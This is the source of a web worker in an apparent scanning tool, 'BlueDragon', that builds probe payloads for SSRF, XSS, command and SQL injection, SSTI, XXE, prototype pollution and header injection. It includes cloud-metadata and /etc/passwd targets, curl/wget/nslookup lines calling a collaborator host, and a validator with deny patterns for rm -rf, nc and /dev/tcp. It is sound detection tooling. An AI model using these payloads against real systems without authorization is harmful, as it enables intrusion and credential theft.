/**
 * BlueDragon Web Security - Payload Worker
 * Generates and validates safe exploitation payloads
 */

/**
 * Process payload generation task
 */
async function processTask(task) {
  const { type, data } = task;

  switch (type) {
    case 'generatePayloads':
      return generatePayloads(data);
    case 'validatePayload':
      return validatePayload(data);
    case 'encodePayload':
      return encodePayload(data);
    case 'generateTimingPayloads':
      return generateTimingPayloads(data);
    case 'generateDnsPayloads':
      return generateDnsPayloads(data);
    default:
      throw new Error(`Unknown task type: ${type}`);
  }
}

/**
 * Generate safe test payloads for a vulnerability type
 */
function generatePayloads(data) {
  const { vulnType, context, collaboratorDomain } = data;
  const payloads = [];

  switch (vulnType) {
    case 'ssrf':
      payloads.push(...generateSsrfPayloads(context, collaboratorDomain));
      break;
    case 'xss':
      payloads.push(...generateXssPayloads(context));
      break;
    case 'rce':
      payloads.push(...generateRcePayloads(context, collaboratorDomain));
      break;
    case 'prototype_pollution':
      payloads.push(...generatePrototypePollutionPayloads(context));
      break;
    case 'header_injection':
      payloads.push(...generateHeaderInjectionPayloads(context));
      break;
    default:
      throw new Error(`Unknown vulnerability type: ${vulnType}`);
  }

  return payloads;
}

/**
 * Generate SSRF test payloads
 */
function generateSsrfPayloads(context, collaboratorDomain) {
  const { probeId } = context;
  const payloads = [];

  // DNS-based detection
  if (collaboratorDomain) {
    payloads.push({
      name: 'dns_exfil',
      payload: `http://${probeId}.${collaboratorDomain}`,
      description: 'DNS exfiltration via collaborator'
    });

    payloads.push({
      name: 'https_dns_exfil',
      payload: `https://${probeId}.${collaboratorDomain}`,
      description: 'HTTPS DNS exfiltration'
    });
  }

  // Cloud metadata endpoints (read-only)
  payloads.push({
    name: 'aws_metadata',
    payload: 'http://169.254.169.254/latest/meta-data/',
    description: 'AWS metadata endpoint'
  });

  payloads.push({
    name: 'gcp_metadata',
    payload: 'http://metadata.google.internal/computeMetadata/v1/',
    description: 'GCP metadata endpoint',
    headers: { 'Metadata-Flavor': 'Google' }
  });

  payloads.push({
    name: 'azure_metadata',
    payload: 'http://169.254.169.254/metadata/instance',
    description: 'Azure metadata endpoint',
    headers: { 'Metadata': 'true' }
  });

  // Local file read attempts
  payloads.push({
    name: 'file_read',
    payload: 'file:///etc/passwd',
    description: 'Local file read via file:// protocol'
  });

  // Localhost checks
  payloads.push({
    name: 'localhost',
    payload: 'http://localhost/',
    description: 'Localhost access'
  });

  payloads.push({
    name: 'localhost_127',
    payload: 'http://127.0.0.1/',
    description: 'Loopback address'
  });

  // IPv6 localhost
  payloads.push({
    name: 'ipv6_localhost',
    payload: 'http://[::1]/',
    description: 'IPv6 loopback'
  });

  // Bypass attempts
  payloads.push({
    name: 'decimal_ip',
    payload: 'http://2130706433/',
    description: 'Decimal IP for localhost'
  });

  payloads.push({
    name: 'hex_ip',
    payload: 'http://0x7f000001/',
    description: 'Hex IP for localhost'
  });

  return payloads;
}

/**
 * Generate XSS test payloads (safe, non-destructive)
 */
function generateXssPayloads(context) {
  const { probeId } = context;
  const payloads = [];

  // Basic reflection tests
  payloads.push({
    name: 'basic_tag',
    payload: `<bluedragon-${probeId}>`,
    description: 'Custom tag reflection test'
  });

  payloads.push({
    name: 'img_onerror',
    payload: `<img src=x onerror="window['bluedragon_${probeId}']=1">`,
    description: 'Image error handler test'
  });

  payloads.push({
    name: 'svg_onload',
    payload: `<svg onload="window['bluedragon_${probeId}']=1">`,
    description: 'SVG load handler test'
  });

  // Attribute injection
  payloads.push({
    name: 'attr_break',
    payload: `" onmouseover="window['bluedragon_${probeId}']=1" x="`,
    description: 'Attribute breakout test'
  });

  payloads.push({
    name: 'event_handler',
    payload: `' onfocus='window.bluedragon_${probeId}=1' autofocus='`,
    description: 'Event handler injection'
  });

  // Template injection markers
  payloads.push({
    name: 'template_angular',
    payload: `{{constructor.constructor('window.bluedragon_${probeId}=1')()}}`,
    description: 'Angular template injection'
  });

  payloads.push({
    name: 'template_vue',
    payload: `{{_c.constructor('window.bluedragon_${probeId}=1')()}}`,
    description: 'Vue template injection'
  });

  // Script context
  payloads.push({
    name: 'script_break',
    payload: `</script><script>window.bluedragon_${probeId}=1</script>`,
    description: 'Script tag breakout'
  });

  return payloads;
}

/**
 * Generate RCE test payloads (timing and DNS-based, no actual commands)
 */
function generateRcePayloads(context, collaboratorDomain) {
  const { probeId, platform } = context;
  const payloads = [];

  // Timing-based payloads
  payloads.push({
    name: 'sleep_bash',
    payload: '; sleep 5 #',
    description: 'Bash sleep injection',
    expectedDelay: 5000
  });

  payloads.push({
    name: 'sleep_windows',
    payload: '& timeout /t 5 &',
    description: 'Windows timeout injection',
    expectedDelay: 5000
  });

  payloads.push({
    name: 'sleep_python',
    payload: '__import__("time").sleep(5)',
    description: 'Python sleep injection',
    expectedDelay: 5000
  });

  payloads.push({
    name: 'sleep_ruby',
    payload: '`sleep 5`',
    description: 'Ruby backtick injection',
    expectedDelay: 5000
  });

  payloads.push({
    name: 'sleep_php',
    payload: '<?php sleep(5); ?>',
    description: 'PHP sleep injection',
    expectedDelay: 5000
  });

  // DNS-based detection
  if (collaboratorDomain) {
    payloads.push({
      name: 'dns_nslookup',
      payload: `; nslookup ${probeId}.${collaboratorDomain} #`,
      description: 'DNS lookup via nslookup'
    });

    payloads.push({
      name: 'dns_curl',
      payload: `; curl ${probeId}.${collaboratorDomain} #`,
      description: 'DNS lookup via curl'
    });

    payloads.push({
      name: 'dns_wget',
      payload: `; wget ${probeId}.${collaboratorDomain} #`,
      description: 'DNS lookup via wget'
    });

    payloads.push({
      name: 'dns_powershell',
      payload: `& powershell -c "Invoke-WebRequest ${probeId}.${collaboratorDomain}" &`,
      description: 'DNS lookup via PowerShell'
    });
  }

  return payloads;
}

/**
 * Generate prototype pollution test payloads
 */
function generatePrototypePollutionPayloads(context) {
  const { probeId } = context;
  const payloads = [];

  // Basic __proto__ pollution
  payloads.push({
    name: 'proto_basic',
    payload: { '__proto__': { [`bluedragon_${probeId}`]: true } },
    description: 'Basic __proto__ pollution'
  });

  payloads.push({
    name: 'constructor_proto',
    payload: { 'constructor': { 'prototype': { [`bluedragon_${probeId}`]: true } } },
    description: 'Constructor prototype pollution'
  });

  // Nested pollution
  payloads.push({
    name: 'nested_proto',
    payload: { 'x': { '__proto__': { [`bluedragon_${probeId}`]: true } } },
    description: 'Nested __proto__ pollution'
  });

  // Common gadgets (detection only)
  payloads.push({
    name: 'shell_gadget',
    payload: { '__proto__': { 'shell': '/bin/sh' } },
    description: 'Shell gadget test',
    gadgetType: 'command_execution'
  });

  payloads.push({
    name: 'env_gadget',
    payload: { '__proto__': { 'NODE_OPTIONS': '--require /tmp/x' } },
    description: 'NODE_OPTIONS gadget test',
    gadgetType: 'environment'
  });

  return payloads;
}

/**
 * Generate header injection test payloads
 */
function generateHeaderInjectionPayloads(context) {
  const { probeId } = context;
  const payloads = [];

  // Host header injection
  payloads.push({
    name: 'host_injection',
    headers: { 'Host': `${probeId}.attacker.com` },
    description: 'Host header injection'
  });

  payloads.push({
    name: 'x_forwarded_host',
    headers: { 'X-Forwarded-Host': `${probeId}.attacker.com` },
    description: 'X-Forwarded-Host injection'
  });

  // CRLF injection
  payloads.push({
    name: 'crlf_header',
    headers: { 'X-Test': `value\r\nX-Injected: ${probeId}` },
    description: 'CRLF header injection'
  });

  payloads.push({
    name: 'crlf_encoded',
    headers: { 'X-Test': `value%0d%0aX-Injected: ${probeId}` },
    description: 'URL-encoded CRLF injection'
  });

  // Cache poisoning headers
  payloads.push({
    name: 'x_original_url',
    headers: { 'X-Original-URL': `/admin?bluedragon=${probeId}` },
    description: 'X-Original-URL injection'
  });

  payloads.push({
    name: 'x_rewrite_url',
    headers: { 'X-Rewrite-URL': `/admin?bluedragon=${probeId}` },
    description: 'X-Rewrite-URL injection'
  });

  return payloads;
}

/**
 * Generate timing-based detection payloads
 */
function generateTimingPayloads(data) {
  const { vulnType, delays } = data;
  const payloads = [];

  const targetDelays = delays || [5, 10];

  for (const delay of targetDelays) {
    switch (vulnType) {
      case 'sql':
        payloads.push({
          name: `sql_sleep_${delay}s`,
          payload: `' AND SLEEP(${delay})--`,
          expectedDelay: delay * 1000,
          type: 'mysql'
        });
        payloads.push({
          name: `sql_pg_sleep_${delay}s`,
          payload: `'; SELECT pg_sleep(${delay});--`,
          expectedDelay: delay * 1000,
          type: 'postgres'
        });
        payloads.push({
          name: `sql_waitfor_${delay}s`,
          payload: `'; WAITFOR DELAY '00:00:0${delay}';--`,
          expectedDelay: delay * 1000,
          type: 'mssql'
        });
        break;

      case 'command':
        payloads.push({
          name: `cmd_sleep_${delay}s`,
          payload: `; sleep ${delay} #`,
          expectedDelay: delay * 1000,
          type: 'unix'
        });
        payloads.push({
          name: `cmd_timeout_${delay}s`,
          payload: `& timeout /t ${delay} &`,
          expectedDelay: delay * 1000,
          type: 'windows'
        });
        break;

      case 'ssti':
        payloads.push({
          name: `ssti_sleep_${delay}s`,
          payload: `{{__import__('time').sleep(${delay})}}`,
          expectedDelay: delay * 1000,
          type: 'jinja2'
        });
        break;
    }
  }

  return payloads;
}

/**
 * Generate DNS exfiltration payloads
 */
function generateDnsPayloads(data) {
  const { collaboratorDomain, probeId, contexts } = data;

  if (!collaboratorDomain) {
    throw new Error('Collaborator domain required for DNS payloads');
  }

  const payloads = [];
  const targetContexts = contexts || ['url', 'command', 'xxe'];

  for (const context of targetContexts) {
    switch (context) {
      case 'url':
        payloads.push({
          name: 'dns_url_http',
          payload: `http://${probeId}.${collaboratorDomain}/`,
          context: 'url'
        });
        payloads.push({
          name: 'dns_url_https',
          payload: `https://${probeId}.${collaboratorDomain}/`,
          context: 'url'
        });
        break;

      case 'command':
        payloads.push({
          name: 'dns_nslookup',
          payload: `nslookup ${probeId}.${collaboratorDomain}`,
          context: 'command'
        });
        payloads.push({
          name: 'dns_dig',
          payload: `dig ${probeId}.${collaboratorDomain}`,
          context: 'command'
        });
        payloads.push({
          name: 'dns_curl',
          payload: `curl ${probeId}.${collaboratorDomain}`,
          context: 'command'
        });
        break;

      case 'xxe':
        payloads.push({
          name: 'dns_xxe_dtd',
          payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://${probeId}.${collaboratorDomain}/">]><foo>&xxe;</foo>`,
          context: 'xxe'
        });
        payloads.push({
          name: 'dns_xxe_param',
          payload: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://${probeId}.${collaboratorDomain}/"> %xxe;]>`,
          context: 'xxe'
        });
        break;
    }
  }

  return payloads;
}

/**
 * Validate payload safety
 */
function validatePayload(data) {
  const { payload } = data;
  const issues = [];

  // Check for destructive commands
  const destructivePatterns = [
    /rm\s+-rf/i,
    /del\s+\/[fqs]/i,
    /format\s+[a-z]:/i,
    /drop\s+table/i,
    /drop\s+database/i,
    /truncate\s+table/i,
    /delete\s+from/i,
    /update\s+.*set/i,
    /insert\s+into/i,
    /shutdown/i,
    /reboot/i,
    /halt/i,
    /poweroff/i,
    /mkfs/i,
    /dd\s+if=/i
  ];

  const payloadStr = typeof payload === 'string' ? payload : JSON.stringify(payload);

  for (const pattern of destructivePatterns) {
    if (pattern.test(payloadStr)) {
      issues.push({
        severity: 'critical',
        message: `Destructive command detected: ${pattern}`,
        blocked: true
      });
    }
  }

  // Check for data exfiltration (beyond DNS)
  const exfilPatterns = [
    /\|\s*nc\s+/i,
    />\s*\/dev\/tcp/i,
    /base64.*\|\s*curl/i
  ];

  for (const pattern of exfilPatterns) {
    if (pattern.test(payloadStr)) {
      issues.push({
        severity: 'high',
        message: `Potential data exfiltration: ${pattern}`,
        blocked: false
      });
    }
  }

  return {
    safe: issues.filter(i => i.blocked).length === 0,
    issues
  };
}

/**
 * Encode payload for various contexts
 */
function encodePayload(data) {
  const { payload, encodings } = data;
  const results = {};

  for (const encoding of encodings) {
    switch (encoding) {
      case 'url':
        results.url = encodeURIComponent(payload);
        break;
      case 'url_double':
        results.url_double = encodeURIComponent(encodeURIComponent(payload));
        break;
      case 'base64':
        results.base64 = btoa(payload);
        break;
      case 'html':
        results.html = payload.replace(/[&<>"']/g, char => {
          const entities = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
          return entities[char];
        });
        break;
      case 'unicode':
        results.unicode = payload.split('').map(c =>
          c.charCodeAt(0) > 127 ? `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}` : c
        ).join('');
        break;
      case 'hex':
        results.hex = payload.split('').map(c =>
          '%' + c.charCodeAt(0).toString(16).padStart(2, '0')
        ).join('');
        break;
      default:
        results[encoding] = payload;
    }
  }

  return results;
}

// Worker message handler
self.onmessage = async function(e) {
  const { id, task } = e.data;

  try {
    const result = await processTask(task);
    self.postMessage({ id, success: true, result });
  } catch (error) {
    self.postMessage({ id, success: false, error: error.message });
  }
};

// Signal worker is ready
self.postMessage({ type: 'ready' });
